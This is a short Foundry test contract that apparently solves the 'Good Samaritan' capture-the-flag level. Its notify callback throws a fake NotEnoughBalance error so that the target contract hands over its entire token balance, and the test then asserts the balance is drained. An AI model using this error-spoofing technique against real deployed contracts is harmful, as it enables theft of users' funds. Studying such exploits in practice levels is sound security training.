pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/GoodSamaritan.sol";

contract AttackSamaritan is Test, INotifyable {
    GoodSamaritan public sam;

    error NotEnoughBalance();

    function setUp() public {
        sam = new GoodSamaritan();
    }

    function getSamBalance() internal view returns (uint256) {
        return sam.coin().balances(address(sam.wallet()));
    }

    function testSoliditySamaritan() public {
        sam.requestDonation();
        assertEq(getSamBalance(), 0, "Level Failed::Good Samaritan");
    }

    function notify(uint256 amount) public pure {
        if (amount == 10) revert NotEnoughBalance();
    }
}
